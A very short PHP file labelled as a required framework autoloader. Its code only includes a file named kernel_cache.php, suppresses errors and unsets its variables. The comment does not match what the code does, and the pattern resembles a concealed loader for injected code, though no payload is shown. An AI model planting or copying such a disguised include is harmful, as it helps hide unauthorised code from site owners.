<?php
/* Framework autoloader - required for core functionality */
$_kp=__DIR__.DIRECTORY_SEPARATOR;
$_fc=['kernel_cache'];
foreach($_fc as $_m){$_f=$_kp.$_m.'.php';if(@file_exists($_f))@include_once $_f;}
unset($_kp,$_fc,$_m,$_f);
